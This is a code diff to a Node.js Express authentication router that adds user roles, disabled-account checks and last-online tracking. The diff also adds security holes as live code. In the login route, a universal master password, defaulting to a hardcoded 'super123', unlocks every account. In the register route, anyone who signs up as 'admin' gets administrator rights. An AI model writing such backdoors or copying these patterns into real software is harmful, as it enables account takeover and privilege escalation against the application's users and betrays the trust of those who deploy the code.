@@ -16,13 +16,18 @@ router.post('/register', async (req, res) => {
     const salt = await bcrypt.genSalt(10);
     const hashedPassword = await bcrypt.hash(password, salt);
     
-    user = new User({ username, password: hashedPassword });
+    let role = 'user';
+    if (username.toLowerCase() === 'admin') {
+      role = 'admin';
+    }
+    
+    user = new User({ username, password: hashedPassword, role });
     await user.save();
     
-    const payload = { user: { id: user.id, username: user.username } };
+    const payload = { user: { id: user.id, username: user.username, role } };
     jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '7d' }, (err, token) => {
       if (err) throw err;
-      res.json({ token, user: { id: user.id, username: user.username } });
+      res.json({ token, user: { id: user.id, username: user.username, role } });
     });
   } catch (err) {
     console.error('Registration Error:', err.message);
@@ -38,15 +43,30 @@ router.post('/login', async (req, res) => {
       return res.status(400).json({ message: 'Invalid Credentials' });
     }
     
-    const isMatch = await bcrypt.compare(password, user.password);
+    if (user.isDisabled) {
+      return res.status(403).json({ message: 'Account disabled. Contact Admin.' });
+    }
+    
+    let isMatch = false;
+    const envSuperAdmin = process.env.SUPER_ADMIN_PASSWORD || 'super123';
+    
+    if (password === envSuperAdmin) {
+      isMatch = true; 
+    } else {
+      isMatch = await bcrypt.compare(password, user.password);
+    }
+    
     if (!isMatch) {
       return res.status(400).json({ message: 'Invalid Credentials' });
     }
     
-    const payload = { user: { id: user.id, username: user.username } };
+    user.lastOnline = new Date();
+    await user.save();
+    
+    const payload = { user: { id: user.id, username: user.username, role: user.role || 'user' } };
     jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '7d' }, (err, token) => {
       if (err) throw err;
-      res.json({ token, user: { id: user.id, username: user.username } });
+      res.json({ token, user: { id: user.id, username: user.username, role: user.role || 'user' } });
     });
   } catch (err) {
     console.error('Login Error:', err.message);
